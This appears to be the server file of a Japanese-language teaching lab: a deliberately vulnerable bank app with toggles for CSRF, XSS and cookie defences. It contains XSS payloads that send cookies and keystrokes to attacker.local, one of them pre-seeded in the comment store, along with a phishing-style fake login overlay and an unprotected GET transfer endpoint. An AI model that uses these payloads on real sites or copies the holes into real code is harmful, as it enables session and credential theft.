// bank.local:3000
const express = require('express')
const crypto = require('crypto')
const path = require('path')

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(express.static(path.join(__dirname, 'public')))

// --- In-memory state ---
const sessions = {}
const comments = [
  `<img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)">`,
]
let csrfProtection = true
let sameSite = ''  // '' = SameSite未設定（制限なし）
let xssProtection = false  // false = innerHTML（危険）, true = DOMPurify（安全）
let cspEnabled = false     // true = Content-Security-Policy ヘッダーを付与
let httpOnly = true        // false = JSからCookieが読める

// --- CSP middleware ---
// nonce を生成して res.locals に保存し、正規のインラインスクリプトだけ許可する
app.use((req, res, next) => {
  if (cspEnabled) {
    const nonce = crypto.randomBytes(16).toString('base64')
    res.locals.nonce = nonce
    res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}'`)
  } else {
    res.locals.nonce = ''
  }
  next()
})

// --- Helpers ---
function getSession(req) {
  const raw = req.headers.cookie || ''
  const cookies = Object.fromEntries(
    raw.split(';').filter(Boolean).map(c => c.trim().split('='))
  )
  return sessions[cookies.session]
}

function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

function setCookieHeader(sessionId) {
  const flags = [
    `session=${sessionId}`,
    httpOnly ? 'HttpOnly' : '',
    sameSite ? `SameSite=${sameSite}` : '',
    'Path=/',
  ].filter(Boolean).join('; ')
  return flags
}

// --- Routes ---

app.get('/', (req, res) => {
  const session = getSession(req)
  const flash = session?._flash || null
  if (session) delete session._flash
  const blocked = req.query.blocked || null
  res.send(session ? dashboard(session, flash, res.locals.nonce) : loginPage(blocked))
})

app.post('/login', (req, res) => {
  const { username, password } = req.body
  if (password !== 'pass') return res.send('パスワードが違います')
  const sessionId = crypto.randomBytes(16).toString('hex')
  const csrfToken = crypto.randomBytes(16).toString('hex')
  sessions[sessionId] = { username, balance: 10000, csrfToken, log: [] }
  res.setHeader('Set-Cookie', setCookieHeader(sessionId))
  res.redirect('/')
})

app.post('/transfer', (req, res) => {
  const session = getSession(req)
  console.log(`[transfer] cookie="${req.headers.cookie || 'none'}" csrfProtection=${csrfProtection} csrf_token="${req.body?.csrf_token}" session=${!!session}`)
  if (!session) {
    return res.redirect('/?blocked=samesite')
  }

  const { to, amount, csrf_token } = req.body

  if (csrfProtection && csrf_token !== session.csrfToken) {
    session._flash = { type: 'blocked', defense: 'csrf_token', msg: `CSRFトークン不一致 → ${to} への ¥${amount} をブロックしました` }
    session.log.push(`🛡️ 送金ブロック → ${to} へ ¥${amount}（CSRFトークン不一致）`)
    return res.redirect('/')
  }

  const amt = parseInt(amount)
  session.balance -= amt
  const isLegitimate = csrf_token && csrf_token === session.csrfToken
  if (isLegitimate) {
    session._flash = { type: 'success', msg: `¥${amt.toLocaleString()} を ${to} に送金しました` }
    session.log.push(`✅ 送金完了（正規） → ${to} へ ¥${amt}`)
  } else {
    session._flash = { type: 'danger', msg: `¥${amt.toLocaleString()} が ${to} に送金されました（⚠️ 攻撃成功 — CSRFトークンなしで通りました）` }
    session.log.push(`💸 攻撃成功 → ${to} へ ¥${amt}（CSRFトークンなし）`)
  }
  res.redirect('/')
})

// GET送金エンドポイント（意図的に脆弱 — GETナビゲーションCSRFデモ用）
app.get('/transfer-get', (req, res) => {
  const session = getSession(req)
  if (!session) {
    return res.redirect('/?blocked=samesite')
  }
  const { to, amount } = req.query
  const amt = parseInt(amount) || 0
  session.balance -= amt
  session._flash = { type: 'danger', msg: `¥${amt.toLocaleString()} が ${to} に送金されました（GETリンクCSRF成功 — Lax は防げない）` }
  session.log.push(`💸 GET送金 → ${to} へ ¥${amt}`)
  res.redirect('/')
})

app.post('/comments', (req, res) => {
  const comment = req.body.comment || ''
  console.log(`[comments] saved: "${comment.slice(0, 80)}"`)
  comments.push(comment)
  res.redirect('/')
})

app.get('/comments', (req, res) => res.send(commentsPage(res.locals.nonce)))

// --- Toggle routes ---
app.get('/toggle-csrf',     (req, res) => { csrfProtection = !csrfProtection; res.redirect('/') })
app.get('/toggle-xss',      (req, res) => { xssProtection = !xssProtection; res.redirect('/') })
app.get('/toggle-csp',      (req, res) => { cspEnabled = !cspEnabled; res.redirect('/') })
app.get('/toggle-samesite', (req, res) => {
  if (sameSite === '') sameSite = 'lax'
  else if (sameSite === 'lax') sameSite = 'strict'
  else sameSite = ''
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})
app.get('/toggle-httponly', (req, res) => {
  httpOnly = !httpOnly
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})

app.get('/reset-comments', (req, res) => { comments.length = 0; res.redirect('/') })
app.get('/logout',  (req, res) => { res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/'); res.redirect('/') })
app.get('/reset',   (req, res) => {
  const session = getSession(req)
  if (session) { session.balance = 10000; session.log = [] }
  res.redirect('/')
})

// --- HTML ---

function css() {
  return `<style>
    * { box-sizing: border-box; }
    body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding-bottom: 60px; }
    .wrap { max-width: 860px; margin: 32px auto; background: white; padding: 32px; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
    h1 { margin: 0 0 4px; font-size: 22px; }
    .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
    input, textarea { display: block; width: 100%; margin: 6px 0 12px; padding: 9px 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
    button, .btn { background: #2c3e50; color: white; border: none; padding: 9px 18px; border-radius: 6px; cursor: pointer; font-size: 14px; text-decoration: none; display: inline-block; }
    button:hover, .btn:hover { background: #34495e; }
    .btn-sm { font-size: 12px; padding: 4px 12px; margin-left: 8px; background: #7f8c8d; border-radius: 4px; color: white; text-decoration: none; display: inline-block; }
    .panel { border: 2px solid #e9ecef; border-radius: 8px; margin: 20px 0; overflow: hidden; }
    .panel-head { background: #f8f9fa; padding: 12px 16px; font-weight: bold; font-size: 14px; border-bottom: 1px solid #e9ecef; }
    .panel-body { padding: 12px 16px; }
    .row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
    .row:last-child { border-bottom: none; }
    .row-label { flex: 1; }
    .row-note { font-size: 12px; color: #666; margin-top: 3px; }
    .tag-on  { background: #d4edda; color: #155724; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
    .tag-off { background: #f8d7da; color: #721c24; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
    .flash { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 15px; font-weight: bold; }
    .flash-danger  { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    .flash-success { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
    .flash-blocked { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .comment-item { border-left: 3px solid #ddd; padding: 6px 10px; margin: 5px 0; font-size: 14px; border-radius: 0 4px 4px 0; background: #fafafa; }
    .preset code { background: #1e1e1e; color: #d4d4d4; padding: 8px 12px; border-radius: 6px; font-size: 12px; display: block; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
    .preset p { margin: 12px 0 4px; font-size: 13px; font-weight: bold; }
    .note { font-size: 12px; color: #888; font-weight: normal; }
    .balance { font-size: 28px; font-weight: bold; color: #2c3e50; }
    code { background: #f0f0f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
    ul { padding-left: 20px; }
    li { margin: 4px 0; font-size: 14px; }
    hr { border: none; border-top: 1px solid #eee; margin: 24px 0; }
    .footer-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #2c3e50; color: #ccc; padding: 10px 24px; font-size: 13px; }
    .footer-bar a { color: #5dade2; }
    .section-title { font-size: 15px; font-weight: bold; margin: 24px 0 8px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: normal; white-space: nowrap; }
    .badge-danger { background: #f8d7da; color: #721c24; }
    .badge-safe   { background: #d4edda; color: #155724; }
  </style>`
}

function loginPage(blocked) {
  const blockedBanner = blocked === 'samesite' ? `
  <div class="flash flash-blocked" style="border-left:4px solid #27ae60">
    🛡️ <strong>SameSite Cookie（${sameSite || 'なし → 本来は弾けない'}）</strong> によってブロックされました<br>
    <span style="font-size:13px;font-weight:normal">別サイトからのリクエストにCookieが付かなかったため、未ログイン扱いになりました</span>
  </div>` : ''

  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank（victim）</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.local</h1>
  <p class="sub">port 3000 — 被害者サイト（銀行）</p>
  ${blockedBanner}
  <p>ユーザー名：何でもOK ／ パスワード：<strong>pass</strong></p>
  <form method="POST" action="/login">
    <input name="username" value="alice" placeholder="ユーザー名">
    <input name="password" type="password" value="pass" placeholder="パスワード">
    <button type="submit">ログイン</button>
  </form>
</div>
</body></html>`
}

function dashboard(session, flash, nonce) {
  const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
  const demoData = JSON.stringify({ comments, xssProtection })
  const hl = flash?.defense  // 発動した対策のkey。対応する行をハイライトする
  const rowHl = (key) => hl === key ? 'background:#d4edda;' : ''

  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank Dashboard</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.local</h1>
  <p class="sub">port 3000 — ${escapeHtml(session.username)} さんがログイン中</p>

  ${flash ? `<div class="flash flash-${flash.type}">${flash.type === 'blocked' ? '🛡️' : flash.type === 'success' ? '✅' : '💀'} ${escapeHtml(flash.msg)}</div>` : ''}

  <div style="display:grid;grid-template-columns:1fr 1.8fr;gap:24px;align-items:start">

    <!-- 左カラム：残高・メモ -->
    <div>
      <p style="margin:0 0 4px;font-size:13px;color:#888">残高</p>
      <p style="margin:0 0 16px"><span class="balance" id="balance">¥${session.balance.toLocaleString()}</span>
        <a href="/reset" class="btn-sm">リセット</a>
      </p>

      ${session.log.length ? `
      <div style="margin-bottom:16px">
        <ul style="margin:0;padding-left:18px">${session.log.slice(-5).map(l => `<li style="font-size:13px;margin:3px 0">${escapeHtml(l)}</li>`).join('')}</ul>
      </div>` : ''}

      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
        <span style="font-size:14px;font-weight:bold">取引メモ</span>
        <a href="/reset-comments" class="btn-sm">クリア</a>
      </div>
      <div id="comments-area" style="margin-bottom:10px"><p style="color:#aaa;font-size:13px">読み込み中...</p></div>

      <form method="POST" action="/comments" style="margin-bottom:8px">
        <textarea name="comment" rows="2" placeholder="メモを入力..." style="font-size:13px;margin-bottom:6px"></textarea>
        <button type="submit" style="font-size:13px;padding:6px 14px">保存</button>
      </form>

      <details style="margin-bottom:12px;font-size:12px">
        <summary style="cursor:pointer;color:#888;user-select:none">XSSペイロード例</summary>
        <div style="margin-top:8px;background:#f8f8f8;border-radius:6px;padding:10px">
          <p style="margin:0 0 4px;font-weight:bold;color:#555">① アラート</p>
          <code style="display:block;margin-bottom:8px;cursor:pointer" onclick="this.closest('form')||document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="alert('XSS')"&gt;</code>
          <p style="margin:0 0 4px;font-weight:bold;color:#555">② 残高を書き換える</p>
          <code style="display:block;margin-bottom:8px;cursor:pointer" onclick="document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="document.getElementById('balance').textContent='¥0'"&gt;</code>
          <p style="margin:0 0 4px;font-weight:bold;color:#555">③ Cookie盗取（HttpOnly OFF で試す）</p>
          <code style="display:block;margin-bottom:8px;cursor:pointer" onclick="document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
          <p style="margin:0 0 4px;font-weight:bold;color:#555">④ キーロガー</p>
          <code style="display:block;cursor:pointer" onclick="document.querySelector('textarea[name=comment]').value=this.textContent">&lt;img src=x onerror="document.addEventListener('keydown',e=&gt;fetch('http://attacker.local:3001/stolen?key='+e.key))"&gt;</code>
          <p style="margin:8px 0 0;color:#888">クリックするとテキストエリアにコピーされます</p>
        </div>
      </details>

      <a href="/logout" class="btn-sm" style="margin-left:0">ログアウト</a>
    </div>

    <!-- 右カラム：対策パネル -->
    <div class="panel">
      <div class="panel-head">🛡️ 対策パネル</div>
      <div class="panel-body" style="padding:0">
        <table style="width:100%;border-collapse:collapse;font-size:13px">
          <thead>
            <tr style="background:#f8f9fa;border-bottom:2px solid #e9ecef">
              <th style="padding:8px 12px;text-align:left">対策</th>
              <th style="padding:8px 8px;text-align:left">何を防ぐか</th>
              <th style="padding:8px 8px;text-align:center;white-space:nowrap">状態</th>
              <th style="padding:8px 12px;text-align:center">操作</th>
            </tr>
          </thead>
          <tbody>
            <tr data-defense="xss_dompur" style="border-bottom:1px solid #f0f0f0;${rowHl('xss_dompur')}">
              <td style="padding:8px 12px;font-weight:bold">DOMPurify<span class="hl-label"></span></td>
              <td style="padding:8px 8px;color:#555;font-size:12px">${xssProtection ? 'onerrorなど危険な属性を除去' : 'メモをそのままinnerHTMLに挿入'}</td>
              <td style="padding:8px 8px;text-align:center"><span class="${xssProtection ? 'tag-on' : 'tag-off'}">${xssProtection ? 'ON' : 'OFF'}</span></td>
              <td style="padding:8px 12px;text-align:center"><a href="/toggle-xss" class="btn-sm">切替</a></td>
            </tr>
            <tr data-defense="csp" style="border-bottom:1px solid #f0f0f0;${rowHl('csp')}">
              <td style="padding:8px 12px;font-weight:bold">CSP<span class="hl-label"></span></td>
              <td style="padding:8px 8px;color:#555;font-size:12px">${cspEnabled ? 'インライン・外部スクリプトをブロック' : 'スクリプト実行の制限なし'}</td>
              <td style="padding:8px 8px;text-align:center"><span class="${cspEnabled ? 'tag-on' : 'tag-off'}">${cspEnabled ? 'ON' : 'OFF'}</span></td>
              <td style="padding:8px 12px;text-align:center"><a href="/toggle-csp" class="btn-sm">切替</a></td>
            </tr>
            <tr style="border-bottom:1px solid #f0f0f0;${rowHl('httponly')}">
              <td style="padding:8px 12px;font-weight:bold">HttpOnly</td>
              <td style="padding:8px 8px;color:#555;font-size:12px">${httpOnly ? 'document.cookieで読めない' : 'JSからCookieが読める'}</td>
              <td style="padding:8px 8px;text-align:center"><span class="${httpOnly ? 'tag-on' : 'tag-off'}">${httpOnly ? 'ON' : 'OFF'}</span></td>
              <td style="padding:8px 12px;text-align:center"><a href="/toggle-httponly" class="btn-sm">切替<br><span style="font-size:10px;color:#aaa">（再ログイン）</span></a></td>
            </tr>
            <tr style="border-bottom:1px solid #f0f0f0;${rowHl('csrf_token')}">
              <td style="padding:8px 12px;font-weight:bold">CSRFトークン${hl === 'csrf_token' ? ' <span class="hl-label" style="color:#155724;font-size:11px">← 発動</span>' : ''}</td>
              <td style="padding:8px 8px;color:#555;font-size:12px">${csrfProtection ? '秘密値を照合、偽造リクエストをブロック' : 'トークン検証なし'}</td>
              <td style="padding:8px 8px;text-align:center"><span class="${csrfProtection ? 'tag-on' : 'tag-off'}">${csrfProtection ? 'ON' : 'OFF'}</span></td>
              <td style="padding:8px 12px;text-align:center"><a href="/toggle-csrf" class="btn-sm">切替</a></td>
            </tr>
            <tr>
              <td style="padding:8px 12px;font-weight:bold">SameSite</td>
              <td style="padding:8px 8px;color:#555;font-size:12px">${
                sameSite === 'strict' ? 'クロスサイト全リクエストをブロック' :
                sameSite === 'lax'    ? 'POSTはブロック、GETリンクは通る' :
                                        '未設定 — クロスサイトにも自動付与'
              }</td>
              <td style="padding:8px 8px;text-align:center"><span class="${sameSite === 'strict' ? 'tag-on' : 'tag-off'}" style="${sameSite === 'lax' ? 'background:#fff3cd;color:#856404' : ''}">${sameSite || 'なし'}</span></td>
              <td style="padding:8px 12px;text-align:center"><a href="/toggle-samesite" class="btn-sm">切替<br><span style="font-size:10px;color:#aaa">（再ログイン）</span></a></td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

  </div>

</div>
<div class="footer-bar">
  CSRFを試すには → <a href="http://attacker.local:3001" target="_blank">attacker.local:3001（攻撃者サイト）</a> を開く
</div>

<!-- コメントデータをDOMに埋め込む（nonce付きで正規スクリプトとして許可） -->
<script${nonceAttr}>
window.__DEMO_DATA__ = ${demoData};
window.highlightDefense = function(key) {
  var row = document.querySelector('[data-defense="' + key + '"]');
  if (!row || row.dataset.highlighted) return;
  row.style.background = '#d4edda';
  row.dataset.highlighted = '1';
  var lbl = row.querySelector('.hl-label');
  if (lbl) lbl.innerHTML = ' &#x1F6E1;&#xFE0F; <span style="color:#155724;font-size:11px">← 今ここが発動</span>';
};
window.addEventListener('securitypolicyviolation', function() {
  window.highlightDefense('csp');
});
</script>
<script src="/purify.min.js"></script>
<script src="/client.js"></script>
</body></html>`
}

function commentsPage(nonce) {
  const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>取引メモ（XSSデモ）</title>${css()}</head><body>
<div class="wrap">
  <h1>📝 取引メモを書く</h1>
  <p class="sub">保存するとダッシュボードに戻ります。仕込んだコードが <strong>銀行の画面で</strong> 実行されます。</p>

  <form method="POST" action="/comments">
    <textarea name="comment" rows="3" placeholder="ペイロードをここに貼り付けて保存..."></textarea>
    <button type="submit">保存してダッシュボードへ</button>
  </form>

  <div class="preset">
    <p>① アラートを出す（動作確認）</p>
    <code>&lt;img src=x onerror="alert('XSS: bank.local で実行されました')"&gt;</code>

    <p>② 残高を書き換える</p>
    <code>&lt;img src=x onerror="document.getElementById('balance').textContent='¥0'"&gt;</code>

    <p>③ 画面を偽のログインフォームで乗っ取る</p>
    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:80px;text-align:center;font-family:sans-serif&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px;width:220px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px;width:220px&gt;&lt;button style=padding:8px 24px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>

    <p>④ CookieをattackerのサーバーにHTTPで送信する <span class="note">— 対策パネルで HttpOnly を切り替えて試す</span></p>
    <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>

    <p>⑤ キーロガー（入力内容をattackerに送信） <span class="note">— 投稿後、ダッシュボードの入力欄でタイプするとattackerのターミナルに表示される</span></p>
    <code>&lt;img src=x onerror="document.addEventListener('keydown',e=&gt;fetch('http://attacker.local:3001/stolen?key='+e.key))"&gt;</code>

    <p style="margin-top:16px;color:#27ae60;font-size:13px">対策を試すには：ダッシュボードに戻り「XSS保護 ON」または「CSP ON」に切り替えてから同じペイロードを再投稿する</p>
  </div>

  <a href="/">← ダッシュボードへ戻る</a>
</div>
</body></html>`
}

app.listen(3000, () => {
  console.log('victim (bank): http://bank.local:3000')
})
